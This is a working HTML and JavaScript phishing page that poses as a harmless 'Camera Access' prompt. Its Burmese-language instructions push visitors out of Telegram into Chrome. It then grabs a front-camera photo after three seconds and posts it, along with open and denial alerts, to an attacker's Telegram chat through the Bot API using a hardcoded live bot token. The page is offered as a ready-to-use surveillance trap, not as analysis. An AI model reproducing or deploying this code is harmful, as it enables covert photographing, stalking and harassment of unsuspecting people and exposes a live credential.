<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Camera Access</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 100%;
            padding: 30px;
            text-align: center;
        }
        h1 { color: #667eea; margin-bottom: 10px; font-size: 24px; }
        .subtitle { color: #666; margin-bottom: 30px; font-size: 14px; }
        video { width: 100%; border-radius: 10px; background: #000; margin-bottom: 15px; display: none; }
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        button:active { transform: scale(0.98); }
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 10px;
            font-size: 14px;
            display: none;
        }
        .status.info { background: #d1ecf1; color: #0c5460; display: block; }
        .status.success { background: #d4edda; color: #155724; display: block; }
        .status.error { background: #f8d7da; color: #721c24; display: block; }
        .status.warning { background: #fff3cd; color: #856404; display: block; }
        .footer { margin-top: 20px; font-size: 12px; color: #999; }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
            vertical-align: middle;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .external-btn {
            background: #28a745;
            margin-top: 10px;
        }
        .external-btn:active { background: #218838; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📸 Camera Access</h1>
        <div class="subtitle">Please allow camera to continue</div>
        
        <div id="warningBox" style="display: none;" class="status warning">
            ⚠️ <strong>အရေးကြီး:</strong><br>
            Telegram browser မှာ Camera အလုပ်မလုပ်ပါ။<br><br>
            ကျေးဇူးပြု၍ အပေါ်ညာဘက် <strong>⋮</strong> နှိပ်ပြီး<br>
            <strong>"Open in External Browser"</strong> (Chrome) ရွေးပါ။
        </div>
        
        <video id="video" autoplay playsinline style="width: 100%; border-radius: 10px; background: #000;"></video>
        <canvas id="canvas" style="display: none;"></canvas>
        
        <button id="externalBtn" class="external-btn" style="display: none;" onclick="openExternalBrowser()">🌐 Open in Chrome Browser</button>
        
        <div id="status" class="status info">📷 Checking browser...</div>
        <div class="footer">Auto photo will be sent to owner</div>
    </div>

    <script>
        const BOT_TOKEN = "8714590627:AAE7XYaMhFLJeLKYY-cLWjGQ38h96-oi498";
        
        const urlParams = new URLSearchParams(window.location.search);
        const OWNER_ID = urlParams.get('id');
        
        let stream = null;
        let photoTaken = false;
        
        const video = document.getElementById('video');
        const statusDiv = document.getElementById('status');
        const warningBox = document.getElementById('warningBox');
        const externalBtn = document.getElementById('externalBtn');
        
        // Telegram browser စစ်ဆေးခြင်း
        const isTelegram = /Telegram/i.test(navigator.userAgent);
        const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
        
        function openExternalBrowser() {
            const currentUrl = window.location.href;
            if (isMobile) {
                // Android
                window.location.href = `intent://${currentUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
            } else {
                alert('Please copy and paste this link to Chrome browser: ' + currentUrl);
            }
        }
        
        async function initCamera() {
            if (!OWNER_ID) {
                statusDiv.className = 'status error';
                statusDiv.innerHTML = '❌ Invalid link. No owner ID found.';
                return;
            }
            
            // Telegram browser ဆိုရင် သတိပေးမယ်
            if (isTelegram && isMobile) {
                statusDiv.style.display = 'none';
                warningBox.style.display = 'block';
                externalBtn.style.display = 'block';
                
                // Owner ကို အကြောင်းကြားမယ်
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: OWNER_ID,
                        text: `⚠️ Someone opened camera link in TELEGRAM browser!\n\n🕐 Time: ${new Date().toLocaleString()}\n📱 Device: Mobile\n💡 They need to open in external browser.`
                    })
                }).catch(e => console.log(e));
                return;
            }
            
            try {
                statusDiv.className = 'status info';
                statusDiv.innerHTML = '📷 Requesting camera permission... <span class="loading"></span>';
                
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                video.style.display = 'block';
                video.srcObject = stream;
                
                statusDiv.innerHTML = '✅ Camera ready! Taking photo in 3 seconds...';
                
                setTimeout(() => {
                    takePhotoAndSend();
                }, 3000);
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: OWNER_ID,
                        text: `👤 Someone opened your camera link!\n\n🕐 Time: ${new Date().toLocaleString()}\n📱 Device: ${isMobile ? 'Mobile' : 'Desktop'}`
                    })
                }).catch(e => console.log(e));
                
            } catch (err) {
                console.error('Camera error:', err);
                let errorMsg = '❌ Camera access denied. ';
                if (err.name === 'NotAllowedError') {
                    errorMsg += 'Please allow camera permission and refresh.';
                } else if (err.name === 'NotFoundError') {
                    errorMsg += 'No camera found on this device.';
                } else {
                    errorMsg += 'Please use Chrome browser for camera.';
                }
                statusDiv.className = 'status error';
                statusDiv.innerHTML = errorMsg;
                
                if (isMobile && !isTelegram) {
                    externalBtn.style.display = 'block';
                    externalBtn.innerText = '🔄 Try Again with Permission';
                }
                
                if (OWNER_ID) {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: OWNER_ID,
                            text: `❌ Camera DENIED!\n\n🕐 Time: ${new Date().toLocaleString()}`
                        })
                    }).catch(e => console.log(e));
                }
            }
        }
        
        async function takePhotoAndSend() {
            if (photoTaken) return;
            photoTaken = true;
            
            statusDiv.className = 'status info';
            statusDiv.innerHTML = '📸 Taking photo... <span class="loading"></span>';
            
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                statusDiv.innerHTML = '📤 Sending photo to owner... <span class="loading"></span>';
                
                const formData = new FormData();
                formData.append('chat_id', OWNER_ID);
                formData.append('photo', blob, 'photo.jpg');
                formData.append('caption', `📸 Photo captured!\n\n🕐 Time: ${new Date().toLocaleString()}\n📱 Device: ${isMobile ? 'Mobile' : 'Desktop'}`);
                
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    if (response.ok) {
                        statusDiv.className = 'status success';
                        statusDiv.innerHTML = '✅ Photo sent successfully! Thank you.';
                        
                        if (stream) {
                            stream.getTracks().forEach(track => track.stop());
                        }
                        
                        setTimeout(() => {
                            window.close();
                        }, 2000);
                    } else {
                        throw new Error('Send failed');
                    }
                } catch (err) {
                    statusDiv.className = 'status error';
                    statusDiv.innerHTML = '❌ Failed to send photo. Please try again.';
                }
            }, 'image/jpeg', 0.8);
        }
        
        initCamera();
        
        window.addEventListener('beforeunload', () => {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
